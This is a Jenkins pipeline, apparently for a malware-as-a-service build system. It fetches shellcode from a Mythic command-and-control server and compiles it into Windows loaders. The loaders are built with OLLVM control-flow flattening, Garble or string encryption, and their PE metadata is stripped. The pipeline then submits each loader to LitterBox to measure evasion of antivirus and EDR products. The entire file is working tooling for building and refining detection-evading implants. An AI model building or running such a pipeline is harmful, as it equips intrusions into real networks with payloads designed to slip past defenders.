pipeline {
    agent none

    parameters {
        choice(name: 'LANGUAGE', choices: ['c-mingw', 'c-ollvm', 'go-garble', 'nim', 'csharp'], description: 'Toolchain for compilation')
        choice(name: 'OUTPUT_FORMAT', choices: ['exe', 'dll', 'shellcode'], description: 'Output format')
        choice(name: 'OBFUSCATION', choices: ['none', 'ollvm-cff', 'ollvm-bcf-cff', 'ollvm-full', 'ollvm-heavy', 'garble-literals', 'string-encrypt'], description: 'Obfuscation profile')
        string(name: 'SHELLCODE_PATH', defaultValue: '', description: 'Path to shellcode binary (relative to repo)')
        string(name: 'MYTHIC_PAYLOAD_UUID', defaultValue: '', description: 'Mythic payload UUID to fetch shellcode from')
        booleanParam(name: 'LITTERBOX_SCAN', defaultValue: true, description: 'Submit to LitterBox after build')
        choice(name: 'SCAN_TYPE', choices: ['all', 'static', 'dynamic', 'edr'], description: 'LitterBox scan profile')
        booleanParam(name: 'PE_SANITISE', defaultValue: true, description: 'Strip PE metadata post-build')
    }

    environment {
        LITTERBOX_URL    = credentials('litterbox-url')
        MYTHIC_URL       = credentials('mythic-url')
        MYTHIC_API_TOKEN = credentials('mythic-api-token')
        ARTIFACT_DIR     = "/payloads/${env.BUILD_TAG}"
    }

    stages {
        stage('Checkout') {
            agent { label 'linux-generic' }
            steps {
                checkout scm
                stash includes: '**', name: 'source'
            }
        }

        stage('Fetch Mythic Payload') {
            when {
                beforeAgent true
                expression { params.MYTHIC_PAYLOAD_UUID?.trim() }
            }
            agent { label 'linux-generic' }
            steps {
                sh """
                    mkdir -p shellcode
                    curl -k -H "apitoken: \${MYTHIC_API_TOKEN}" \\
                        "\${MYTHIC_URL}/api/v1.4/payloads/download/${params.MYTHIC_PAYLOAD_UUID}" \\
                        -o shellcode/payload.bin
                """
                stash includes: 'shellcode/**', name: 'shellcode'
            }
        }

        stage('Build - C/MinGW') {
            when {
                beforeAgent true
                expression { params.LANGUAGE == 'c-mingw' }
            }
            agent {
                docker {
                    image 'maas-builder-c'
                    label 'linux-c'
                    args '-v /payloads:/payloads'
                }
            }
            steps {
                unstash 'source'
                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
                sh """
                    mkdir -p shellcode
                    [ -f shellcode/payload.bin ] || printf '\\xcc' > shellcode/payload.bin
                    x86_64-w64-mingw32-windres src/resource.rc -o resource.o
                    x86_64-w64-mingw32-gcc -o loader.${params.OUTPUT_FORMAT == 'dll' ? 'dll' : 'exe'} \\
                        src/main.c src/payload.c src/techniques/*.c resource.o \\
                        -Isrc ${params.OUTPUT_FORMAT == 'dll' ? '-shared' : ''} \\
                        -lntdll -lkernel32 -mwindows -s -O2
                """
                stash includes: "loader.*", name: 'artifact'
            }
        }

        stage('Build - C/OLLVM') {
            when {
                beforeAgent true
                expression { params.LANGUAGE == 'c-ollvm' }
            }
            agent {
                docker {
                    image 'maas-builder-c'
                    label 'linux-c'
                    args '-v /payloads:/payloads'
                }
            }
            steps {
                unstash 'source'
                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
                sh """
                    mkdir -p shellcode
                    [ -f shellcode/payload.bin ] || printf '\\xcc' > shellcode/payload.bin
                """
                script {
                    def ollvmFlags = ''
                    switch (params.OBFUSCATION) {
                        case 'ollvm-cff':
                            ollvmFlags = '-mllvm -fla'; break
                        case 'ollvm-bcf-cff':
                            ollvmFlags = '-mllvm -fla -mllvm -bcf'; break
                        case 'ollvm-full':
                            ollvmFlags = '-mllvm -fla -mllvm -bcf -mllvm -sub'; break
                        case 'ollvm-heavy':
                            ollvmFlags = '-mllvm -fla -mllvm -split -mllvm -bcf -mllvm -bcf_prob=100 -mllvm -bcf_loop=3 -mllvm -sub -mllvm -sub_loop=5'; break
                        default:
                            ollvmFlags = ''; break
                    }
                    sh """
                        x86_64-w64-mingw32-windres src/resource.rc -o resource.o
                        clang --target=x86_64-w64-mingw32 \\
                            ${ollvmFlags} \\
                            -o loader.${params.OUTPUT_FORMAT == 'dll' ? 'dll' : 'exe'} \\
                            src/main.c src/payload.c src/ntapi.c src/techniques/*.c resource.o \\
                            -Isrc ${params.OUTPUT_FORMAT == 'dll' ? '-shared' : ''} \\
                            -lntdll -lkernel32 -s -O1
                    """
                }
                stash includes: "loader.*", name: 'artifact'
            }
        }

        stage('Build - Go/Garble') {
            when {
                beforeAgent true
                expression { params.LANGUAGE == 'go-garble' }
            }
            agent {
                docker {
                    image 'maas-builder-go'
                    label 'linux-go'
                    args '-v /payloads:/payloads'
                }
            }
            steps {
                unstash 'source'
                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
                sh """
                    GOOS=windows GOARCH=amd64 \\
                    garble -literals -tiny build \\
                        -o loader.exe -ldflags="-s -w" \\
                        ./cmd/loader
                """
                stash includes: 'loader.exe', name: 'artifact'
            }
        }

        stage('Build - Nim') {
            when {
                beforeAgent true
                expression { params.LANGUAGE == 'nim' }
            }
            agent {
                docker {
                    image 'maas-builder-nim'
                    label 'linux-nim'
                    args '-v /payloads:/payloads'
                }
            }
            steps {
                unstash 'source'
                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
                sh """
                    nim c -d:mingw -d:release -d:strip \\
                        --opt:size --app:gui \\
                        -o:loader.exe src/loader.nim
                """
                stash includes: 'loader.exe', name: 'artifact'
            }
        }

        stage('Build - C#') {
            when {
                beforeAgent true
                expression { params.LANGUAGE == 'csharp' }
            }
            agent { label 'windows-dotnet' }
            steps {
                unstash 'source'
                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
                bat """
                    dotnet publish src\\Loader.csproj ^
                        -c Release -r win-x64 ^
                        --self-contained true ^
                        -p:PublishSingleFile=true ^
                        -p:PublishTrimmed=true ^
                        -o .
                """
                stash includes: 'Loader.exe', name: 'artifact'
            }
        }

        stage('PE Sanitisation') {
            when {
                beforeAgent true
                expression { params.PE_SANITISE }
            }
            agent { label 'linux-generic' }
            steps {
                unstash 'artifact'
                sh """
                    python3 tools/pe-sanitise.py loader.* \\
                        --strip-rich --randomise-timestamp \\
                        --strip-debug --strip-version-info
                """
                stash includes: "loader.*", name: 'sanitised'
            }
        }

        stage('Checksum') {
            agent { label 'linux-generic' }
            steps {
                script {
                    try { unstash 'sanitised' } catch (e) { unstash 'artifact' }
                }
                sh 'sha256sum loader.* > checksums.sha256'
                stash includes: 'loader.*,checksums.sha256', name: 'final'
            }
        }

        stage('LitterBox Scan') {
            when {
                beforeAgent true
                expression { params.LITTERBOX_SCAN }
            }
            agent { label 'linux-generic' }
            steps {
                unstash 'final'
                sh """#!/bin/bash
                    set -euo pipefail
                    LB="\${LITTERBOX_URL}"
                    FILE=\$(ls loader.* | head -1)
                    SCAN_TYPE="${params.SCAN_TYPE}"
                    TIMEOUT=300

                    echo "[*] Uploading \${FILE} to LitterBox..."
                    UPLOAD=\$(curl -sf -X POST "\${LB}/upload" \\
                        -F "file=@\${FILE};type=application/octet-stream")
                    MD5=\$(echo "\$UPLOAD" | jq -r '.file_info.md5')
                    if [ -z "\$MD5" ] || [ "\$MD5" = "null" ]; then
                        echo "[-] Upload failed"; exit 1
                    fi
                    echo "[+] Uploaded - MD5: \${MD5}"

                    trigger_scan() {
                        local type="\$1"
                        echo "[*] Triggering \${type} scan..."
                        curl -sf -X POST "\${LB}/analyze/\${type}/\${MD5}" | jq . || true
                    }

                    poll_scan() {
                        local url="\$1" elapsed=0 interval=2
                        while [ \$elapsed -lt \$TIMEOUT ]; do
                            RESULT=\$(curl -sf "\$url" 2>/dev/null || echo '{}')
                            STATUS=\$(echo "\$RESULT" | jq -r '.status // empty')
                            case "\$STATUS" in
                                completed|blocked_by_av|partial|error|agent_unreachable|early_termination|"")
                                    return 0 ;;
                            esac
                            sleep \$interval
                            elapsed=\$((elapsed + interval))
                            interval=\$(( interval * 3 / 2 ))
                            [ \$interval -gt 15 ] && interval=15
                        done
                        echo "[!] Poll timed out after \${TIMEOUT}s"
                    }

                    case "\$SCAN_TYPE" in
                        static)
                            trigger_scan static
                            sleep 3
                            ;;
                        dynamic)
                            trigger_scan dynamic
                            poll_scan "\${LB}/api/results/dynamic/\${MD5}"
                            ;;
                        edr)
                            PROFILES=\$(curl -sf "\${LB}/api/edr/profiles" | jq -r '.profiles[].name' 2>/dev/null || true)
                            for p in \$PROFILES; do
                                trigger_scan "edr/\${p}"
                                poll_scan "\${LB}/api/results/edr/\${p}/\${MD5}"
                            done
                            ;;
                        all)
                            trigger_scan static
                            trigger_scan dynamic
                            sleep 3
                            poll_scan "\${LB}/api/results/dynamic/\${MD5}"
                            PROFILES=\$(curl -sf "\${LB}/api/edr/profiles" | jq -r '.profiles[].name' 2>/dev/null || true)
                            for p in \$PROFILES; do
                                trigger_scan "edr/\${p}"
                                poll_scan "\${LB}/api/results/edr/\${p}/\${MD5}"
                            done
                            ;;
                    esac

                    echo "[*] Fetching risk assessment..."
                    curl -sf "\${LB}/api/results/risk/\${MD5}" | jq . > results.json
                    echo "[+] Results: \${LB}/results/info/\${MD5}"
                """
                script {
                    def results = readJSON file: 'results.json'
                    def risk = results.risk_level ?: 'unknown'
                    echo "LitterBox Verdict: ${risk}"
                    echo "Results URL: ${env.LITTERBOX_URL}/results/info/${results.md5 ?: ''}"
                    if (risk == 'critical' || risk == 'high') {
                        unstable("Payload flagged: ${risk} risk")
                    }
                }
                archiveArtifacts artifacts: 'results.json'
            }
        }

        stage('Archive') {
            agent { label 'linux-generic' }
            steps {
                unstash 'final'
                sh """
                    mkdir -p "\${ARTIFACT_DIR}"
                    cp loader.* checksums.sha256 "\${ARTIFACT_DIR}/"
                """
                archiveArtifacts artifacts: 'loader.*,checksums.sha256'
            }
        }
    }

    post {
        always {
            node('linux-generic') {
                deleteDir()
            }
        }
    }
}
